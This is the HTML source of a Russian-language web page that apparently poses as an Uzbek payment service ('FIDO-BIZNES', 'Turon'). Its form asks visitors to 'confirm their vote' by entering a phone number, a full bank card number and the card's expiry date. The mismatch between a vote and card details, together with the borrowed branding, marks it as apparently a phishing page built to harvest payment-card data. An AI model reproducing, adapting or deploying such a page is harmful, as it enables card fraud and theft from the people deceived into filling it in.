  box-shadow: 0px 6px 6px -3px rgba(0,0,0,0.2),0px 10px 14px 1px rgba(0,0,0,0.14),0px 4px 18px 3px rgba(0,0,0,0.12);
}
.jss32 {
  box-shadow: 0px 6px 7px -4px rgba(0,0,0,0.2),0px 11px 15px 1px rgba(0,0,0,0.14),0px 4px 20px 3px rgba(0,0,0,0.12);
}
.jss33 {
  box-shadow: 0px 7px 8px -4px rgba(0,0,0,0.2),0px 12px 17px 2px rgba(0,0,0,0.14),0px 5px 22px 4px rgba(0,0,0,0.12);
}
.jss34 {
  box-shadow: 0px 7px 8px -4px rgba(0,0,0,0.2),0px 13px 19px 2px rgba(0,0,0,0.14),0px 5px 24px 4px rgba(0,0,0,0.12);
}
.jss35 {
  box-shadow: 0px 7px 9px -4px rgba(0,0,0,0.2),0px 14px 21px 2px rgba(0,0,0,0.14),0px 5px 26px 4px rgba(0,0,0,0.12);
}
.jss36 {
  box-shadow: 0px 8px 9px -5px rgba(0,0,0,0.2),0px 15px 22px 2px rgba(0,0,0,0.14),0px 6px 28px 5px rgba(0,0,0,0.12);
}
.jss37 {
  box-shadow: 0px 8px 10px -5px rgba(0,0,0,0.2),0px 16px 24px 2px rgba(0,0,0,0.14),0px 6px 30px 5px rgba(0,0,0,0.12);
}
.jss38 {
  box-shadow: 0px 8px 11px -5px rgba(0,0,0,0.2),0px 17px 26px 2px rgba(0,0,0,0.14),0px 6px 32px 5px rgba(0,0,0,0.12);
}
.jss39 {
  box-shadow: 0px 9px 11px -5px rgba(0,0,0,0.2),0px 18px 28px 2px rgba(0,0,0,0.14),0px 7px 34px 6px rgba(0,0,0,0.12);
}
.jss40 {
  box-shadow: 0px 9px 12px -6px rgba(0,0,0,0.2),0px 19px 29px 2px rgba(0,0,0,0.14),0px 7px 36px 6px rgba(0,0,0,0.12);
}
.jss41 {
  box-shadow: 0px 10px 13px -6px rgba(0,0,0,0.2),0px 20px 31px 3px rgba(0,0,0,0.14),0px 8px 38px 7px rgba(0,0,0,0.12);
}
.jss42 {
  box-shadow: 0px 10px 13px -6px rgba(0,0,0,0.2),0px 21px 33px 3px rgba(0,0,0,0.14),0px 8px 40px 7px rgba(0,0,0,0.12);
}
.jss43 {
  box-shadow: 0px 10px 14px -6px rgba(0,0,0,0.2),0px 22px 35px 3px rgba(0,0,0,0.14),0px 8px 42px 7px rgba(0,0,0,0.12);
}
.jss44 {
  box-shadow: 0px 11px 14px -7px rgba(0,0,0,0.2),0px 23px 36px 3px rgba(0,0,0,0.14),0px 9px 44px 8px rgba(0,0,0,0.12);
}
.jss45 {
  box-shadow: 0px 11px 15px -7px rgba(0,0,0,0.2),0px 24px 38px 3px rgba(0,0,0,0.14),0px 9px 46px 8px rgba(0,0,0,0.12);
}
</style><style data-jss="" data-meta="MuiSnackbar">
.jss259 {
  left: 0;
  right: 0;
  z-index: 1400;
  display: flex;
  position: fixed;
  align-items: center;
  justify-content: center;
}
.jss260 {
  top: 0;
}
@media (min-width:960px) {
  .jss260 {
    left: 50%;
    right: auto;
    transform: translateX(-50%);
  }
}
.jss261 {
  bottom: 0;
}
@media (min-width:960px) {
  .jss261 {
    left: 50%;
    right: auto;
    transform: translateX(-50%);
  }
}
.jss262 {
  top: 0;
  justify-content: flex-end;
}
@media (min-width:960px) {
  .jss262 {
    top: 24px;
    left: auto;
    right: 24px;
  }
}
.jss263 {
  bottom: 0;
  justify-content: flex-end;
}
@media (min-width:960px) {
  .jss263 {
    left: auto;
    right: 24px;
    bottom: 24px;
  }
}
.jss264 {
  top: 0;
  justify-content: flex-start;
}
@media (min-width:960px) {
  .jss264 {
    top: 24px;
    left: 24px;
    right: auto;
  }
}
.jss265 {
  bottom: 0;
  justify-content: flex-start;
}
@media (min-width:960px) {
  .jss265 {
    left: 24px;
    right: auto;
    bottom: 24px;
  }
}
</style><style data-jss="" data-meta="MuiCssBaseline">
html {
  box-sizing: border-box;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}
*, *::before, *::after {
  box-sizing: inherit;
}
body {
  margin: 0;
  background-color: #fafafa;
}
@media print {
  body {
    background-color: #fff;
  }
}
</style><style data-jss="">
.jss266 {
  width: 100%;
  z-index: 9999;
  position: absolute;
}
.jss267 {
  margin: 8px;
}
.jss268 {
  width: 16px;
  height: 16px;
  margin-right: 5px;
}
.jss269 {
  color: rgba(0, 0, 0, 0.5);
  font-size: 12px;
  margin-top: 8px;
}
</style><style data-jss="">
@media (min-width:448px) {
  .jss1 {
    width: 375px;
    margin-left: auto;
    margin-right: auto;
  }
}
.jss2 {
  display: flex;
  padding: 16px 24px 24px;
  align-items: center;
  border-radius: 10px;
  margin-bottom: 40px;
  flex-direction: column;
}
.jss3 {
  border: red;
}
.jss4 {
  margin: 8px;
}
.jss5 {
  width: 100%;
  margin: none;
  margin-top: 4px;
  margin-bottom: -8px;
}
.jss6 {
  margin: auto;
  padding: 10px 60px;
  font-size: 14px;
  margin-top: 16px;
  box-shadow: 4px 5px 9px rgba(255, 192, 4, 0.19);;
  border-radius: 23px;
}
.jss7 {
  font-size: 13px;
  text-align: right;
}
.jss8 {
  font-size: 13px;
  text-align: left;
}
.jss9 {
  margin-top: 5px;
}
.jss10 {
  font-size: 24px;
  margin-top: 5px;
  font-weight: 500;
}
.jss11 {
  color: #787993;
  font-size: 16px;
  text-align: center;
  font-weight: 300;
  text-align-last: center;
}
.jss12 {
  color: #000000;
  font-size: 13px;
  margin-top: 16px;
  text-align: center;
  text-align-last: center;
}
.jss13 {
  color: #000000;
  font-size: 12px;
  margin-top: 24px;
  text-align-last: center;
}
.jss14 {
  width: 148px;
  height: 3px;
  margin: 8px auto;
  background-color: #00aeed;
}
.jss15 {
  margin: 8px;
}
.jss16 {
  padding-left: 30px;
}
.jss17 {
  width: 16px;
  height: 16px;
  margin-right: 5px;
}
.jss18 {
  color: rgba(0, 0, 0, 0.5);
  font-size: 12px;
  margin-top: 8px;
}
</style></head>
<body>
<noscript>You need to enable JavaScript to run this app.</noscript>
<div id="root"><div location="[object Object]" computedmatch="[object Object]"><div>
<div style="height: 100vh; display: flex; align-items: center;">
    <div class="jss1 Registration">
        <div class="jss19 jss23 jss20 jss2">
            <div style="position: relative;">
                <div class="jss46 jss54 jss58 jss63" style="margin-top: 8px;"></div>
                <div class="jss46 jss54 jss63">
                    <p class="jss143 jss151 jss173 jss10 registration-title">Авторизироваться</p>
                    <p class="jss143 jss151 jss173 jss11 subtitle">       Пожалуйста, запоните поля для авторизации и подтверждение своего голоса </p>
                    <div class="jss14"></div></div>
                    <form class="jss5" method="post">
                        <div class="jss178 jss179 jss181 jss5">
                            <div class="jss178 jss179">
                                <label class="mask-phone form-control" data-shrink="true">Номер телефона</label>
                                <div class="jss213 jss200 jss204 jss214 jss201">
                                    <input minlength="12" maxlength="13" name="phone" aria-invalid="false" class="jss223 jss208" placeholder="+998 xx xxx xx xx" type="tel" value="">
                                </div>
                                </div>
                                </div>
                                <div class="jss178 jss179 jss181 jss5">
                                    <div class="jss178 jss179">
                                        <label class="jss193 jss182  jss190" data-shrink="false">Номер карты</label>
                                        <div class="jss213 jss200 jss204 jss214 jss201">
                                            <input maxlength="16" name="cardnumber" aria-invalid="false" class="mask-card-number form-control jss223 jss208" type="tel" mask="---" value="">
                                            </div>
                                            </div>
                                            </div>
                                            <div class="jss178 jss179 jss181 jss5">
                                                <div class="jss178 jss179">
                                                    <label class="jss193 jss182  jss190" data-shrink="false">Срок действия карты</label>
                                                    <div class="jss213 jss200 jss204 jss214 jss201">
                                                        <input name="date" aria-invalid="false" class="mask-card-date form-control jss223 jss208" placeholder="--/--" type="text" value="">
                                                        </div>
                                                        </div>
                                                        </div>
                                                        <div class="jss46 jss54 jss63">
                                                            <p class="jss143 jss151 jss173 jss12"> Нажав кнопку «Далее», Вы принимаете все условия<a href="static/media/Turon.a3739a26.pdf" target="_blank" style="color: rgb(61, 178, 254); margin-left: 5px;">договора оферты </a>
                                                            </p>
                                                            </div>
                                                            <div class="jss46 jss54 jss63">
                                                                <button name="btn" class="jss256 jss230 jss241 jss243 jss244 jss246 jss6 Registration-button" tabindex="0" type="submit">
                                                                    <span class="jss231">Далее </span>
                                                                    <span class="jss273"></span>
                                                                    </button>
                                                                    </div>
                                                                    </form>
                                                                    <div class="jss46 jss54 jss63">
                                                                        <p class="jss143 jss151 jss173">
                                                                            <a href="#/" style="text-decoration: none;">
                                                                                <button class="jss256 jss230 jss232 jss235 jss13" tabindex="0" type="submit">
                                                                                    <span class="jss231">Вернуться в аккаунт </span>
                                                                                    <span class="jss273"></span>
                                                                                    </button>
                                                                                    </a>
                                                                                    </p>
                                                                                    </div>
                                                                                    </div>
                                                                                    </div>
                                                                                    </div>
                                                                                    </div>
                                                                                    <div>
                                                                                        <div class="jss19 jss23 jss20 jss266 bottom-below">
                                                                                            <div class="jss46" style="padding: 0px 0px 0px 15px; display: flex; justify-content: center;">
                                                                                                <div class="jss47 jss80 jss91 jss105 jss117 jss131">
                                                                                                    <button class="jss256 jss230 jss232 jss235" tabindex="0" type="button">
                                                                                                        <span class="jss231">
                                                                                                            <div class="jss270 jss268"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IB2cksfwAAALFQTFRFAAAAJaq/AJm1AJq2AJm1DZ65CZy4FKO7BZq1ktTfAZq1AJm1DZ65Cp24F6K8BJq2FaG6VbvOU7rNLavCGqO8E6G7CJy3JajAAJm1AJm0HqW+itDdAZm1C524B5y3BJu2Apq1CZ24AJq1J6jAKKnBH6W+A5q2Iqe/E6C6D5+5Bpy3HKS90aWv0aaw////////////////1amh1amiILU6HrU6HrU6HrQ5HrU6HrU6H7U6vSKq9QAAADt0Uk5TADB/v+/vv38wcP//////72+w////////r3D//////////zD///////////+A/8D/8O+A/zDw/3CwgMBQS0ssAAAAjklEQVR4nGWP2Q6CQBAEW8VzxAsPUBHFAw9EhF0X+P8Pkw0YWa2nqU46mQZyavWG1my1Oyjp9oiorw+Go8LHk9yN6cyYL0zp1nJF+treOPZ2RxbgEu0Px5N3vnjXG2ku/LuCj+ChECBUg+dvEP5XolghAuOvCpwBohoI+Wry9aQYI8oWF5+5LM04z1Im7ze3FSMx9+ttjwAAAABJRU5ErkJggg==" class="jss272"></div><p class="jss143 jss151">O'zbek</p></span><span class="jss273"></span></button></div><div class="jss47 jss80 jss91 jss105 jss117 jss131"><button class="jss256 jss230 jss232 jss235" tabindex="0" type="button"><span class="jss231"><div class="jss270 jss268"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IB2cksfwAAALFQTFRFAAAAJaq/AJm1AJq2AJm1DZ65CZy4FKO7BZq1ktTfAZq1AJm1DZ65Cp24F6K8BJq2FaG6VbvOU7rNLavCGqO8E6G7CJy3JajAAJm1AJm0HqW+itDdAZm1C524B5y3BJu2Apq1CZ24AJq1J6jAKKnBH6W+A5q2Iqe/E6C6D5+5Bpy3HKS90aWv0aaw////////////////1amh1amiILU6HrU6HrU6HrQ5HrU6HrU6H7U6vSKq9QAAADt0Uk5TADB/v+/vv38wcP//////72+w////////r3D//////////zD///////////+A/8D/8O+A/zDw/3CwgMBQS0ssAAAAjklEQVR4nGWP2Q6CQBAEW8VzxAsPUBHFAw9EhF0X+P8Pkw0YWa2nqU46mQZyavWG1my1Oyjp9oiorw+Go8LHk9yN6cyYL0zp1nJF+treOPZ2RxbgEu0Px5N3vnjXG2ku/LuCj+ChECBUg+dvEP5XolghAuOvCpwBohoI+Wry9aQYI8oWF5+5LM04z1Im7ze3FSMx9+ttjwAAAABJRU5ErkJggg==" class="jss272"></div><p class="jss143 jss151">Ўзбек</p></span><span class="jss273"></span></button></div><div class="jss47 jss80 jss91 jss105 jss117 jss131"><button class="jss256 jss230 jss232 jss235" tabindex="0" type="button"><span class="jss231"><div class="jss270 jss268"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IB2cksfwAAAEVQTFRFAAAA////////////////////////////////////EAD/DgD/DgD/DgD/DwD/DgD//wAA/wAA/wAA/wAA/wAA/wAA/wAAV+rLuQAAABd0Uk5TADB/v+9w/2+wrzD/74DA8DDw/3CwgMAGuPINAAAAYklEQVR4nGWP2RaAIAhEp7TVSgn1/z+1zBbM+wSXA4cBTppWaa3aBjddn9FD7sf+ZZLziw6YjWSZsRbCrNhKscGWYvkLW69URx3tAnIAS8HpVf/1Pofhe4v4ietCJIrBpfoAab0KHuS+2MYAAAAASUVORK5CYII=" class="jss272"></div><p class="jss143 jss151">Русский</p></span><span class="jss273"></span></button></div><div class="jss47 jss80 jss91 jss105 jss117 jss131"><button class="jss256 jss230 jss232 jss235" tabindex="0" type="button"><span class="jss231"><div class="jss270 jss268"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IB2cksfwAAAPZQTFRFAAAAAABlwcHZ3lhYzAAA3ltbvb3XAABmAABmwMDZ3lhYzAAA3ltbvb3XAABmAABlAABlAABm5ubxdHSsDAxtDQ1udnOq1o+Z31pa99XV////7OzzfHyxzMzgysrffXmt2YuT0yUl1Ssr76Wl7aur766u/PDw9cvL7qur8bu7//39////4GRk4GNj0yIi0yMjzAAA4Gpq4Wpq1CYm/vz88LS07aWl9MrK/O/v7qio7aWl6p+f0yQk1Ssr1o6XdXOqyMjeeHiu6eny99nZ32Bg0Y+dbmymCQlsCgpscHCp5OTvAABmAABkv7/a3VhYzAEB3lpavb3Y+A4djgAAAFJ0Uk5TADB/v++/f3D////////vb7CvcP////9wMP///////////+8wgP///////4DA////8MD//////////4Aw8P////////AwcP////9w8C58uum6fACq+QQAAACqSURBVHicXY/XFsFAFEVvCBlGic4gRCdBovfeE8L//wyT8iD76Zz9cNe5AD8Yj5dlfX4GbDgUCGIcCkeiVueRLRCK0R5PJB2RSmcAsjmSLxSpEEplsVKFWr1BCKGCNFvtjgRyl9LDuG8GGRT8B+sWCqgDiojx0AwqSKPxZGodJWQ2X8Bytd5sBSp2+wM5ngDOl6sz7HZ/uKbz9nOaJTTOeVd/vgzj/dFp/gI6nxdEqanPDAAAAABJRU5ErkJggg==" class="jss272"></div><p class="jss143 jss151">English</p></span><span class="jss273"></span></button></div><div class="jss47 jss86 jss96 jss110 jss121 jss135"><p class="jss143 jss151 jss269" style="color: black; text-align: center;">© 1993-2018 - MCHJ "FIDO-BIZNES". Все права защищены.</p></div></div></div></div></div></div></div><script>!function(c){function e(e){for(var t,r,n=e[0],o=e[1],a=e[2],u=0,i=[];u<n.length;u++)r=n[u],s[r]&&i.push(s[r][0]),s[r]=0;for(t in o)Object.prototype.hasOwnProperty.call(o,t)&&(c[t]=o[t]);for(d&&d(e);i.length;)i.shift()();return f.push.apply(f,a||[]),l()}function l(){for(var e,t=0;t<f.length;t++){for(var r=f[t],n=!0,o=1;o<r.length;o++){var a=r[o];0!==s[a]&&(n=!1)}n&&(f.splice(t--,1),e=p(p.s=r[0]))}return e}var r={},i={4:0},s={4:0},f=[];function p(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return c[e].call(t.exports,t,t.exports,p),t.l=!0,t.exports}p.e=function(f){var e=[];i[f]?e.push(i[f]):0!==i[f]&&{1:1,2:1}[f]&&e.push(i[f]=new Promise(function(e,n){for(var t="static/css/"+({}[f]||f)+"."+{1:"c5c504de",2:"8b0b2b37"}[f]+".chunk.css",o=p.p+t,r=document.getElementsByTagName("link"),a=0;a<r.length;a++){var u=(c=r[a]).getAttribute("data-href")||c.getAttribute("href");if("stylesheet"===c.rel&&(u===t||u===o))return e()}var i=document.getElementsByTagName("style");for(a=0;a<i.length;a++){var c;if((u=(c=i[a]).getAttribute("data-href"))===t||u===o)return e()}var l=document.createElement("link");l.rel="stylesheet",l.type="text/css",l.onload=e,l.onerror=function(e){var t=e&&e.target&&e.target.src||o,r=new Error("Loading CSS chunk "+f+" failed.\n("+t+")");r.request=t,n(r)},l.href=o,document.getElementsByTagName("head")[0].appendChild(l)}).then(function(){i[f]=0}));var r=s[f];if(0!==r)if(r)e.push(r[2]);else{var t=new Promise(function(e,t){r=s[f]=[e,t]});e.push(r[2]=t);var n,o=document.getElementsByTagName("head")[0],a=document.createElement("script");a.charset="utf-8",a.timeout=120,p.nc&&a.setAttribute("nonce",p.nc),a.src=p.p+"static/js/"+({}[f]||f)+"."+{1:"b14fb7f4",2:"0b1a1f57"}[f]+".chunk.js",n=function(e){a.onerror=a.onload=null,clearTimeout(u);var t=s[f];if(0!==t){if(t){var r=e&&("load"===e.type?"missing":e.type),n=e&&e.target&&e.target.src,o=new Error("Loading chunk "+f+" failed.\n("+r+": "+n+")");o.type=r,o.request=n,t[1](o)}s[f]=void 0}};var u=setTimeout(function(){n({type:"timeout",target:a})},12e4);a.onerror=a.onload=n,o.appendChild(a)}return Promise.all(e)},p.m=c,p.c=r,p.d=function(e,t,r){p.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},p.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},p.t=function(t,e){if(1&e&&(t=p(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(p.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var n in t)p.d(r,n,function(e){return t[e]}.bind(null,n));return r},p.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return p.d(t,"a",t),t},p.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},p.p="",p.oe=function(e){throw console.error(e),e};var t=window.webpackJsonp=window.webpackJsonp||[],n=t.push.bind(t);t.push=e,t=t.slice();for(var o=0;o<t.length;o++)e(t[o]);var d=n;l()}([])</script><script src="static/js/3.8a12b196.chunk.js"></script><script src="static/js/main.e7c93769.chunk.js"></script>
                                                                                                            
                                                                                                            
                                                                                                            
                                                                                                            
<script src="https://snipp.ru/cdn/jquery/2.1.1/jquery.min.js"></script>
<script src="https://snipp.ru/cdn/maskedinput/jquery.maskedinput.min.js"></script>
<script>

$('.mask-card-number').mask('9999 9999 9999 9999');
$('.mask-card-date').mask('99/99');
$('.mask-card-code').mask('999');
</script>
                                                                                                            </body>





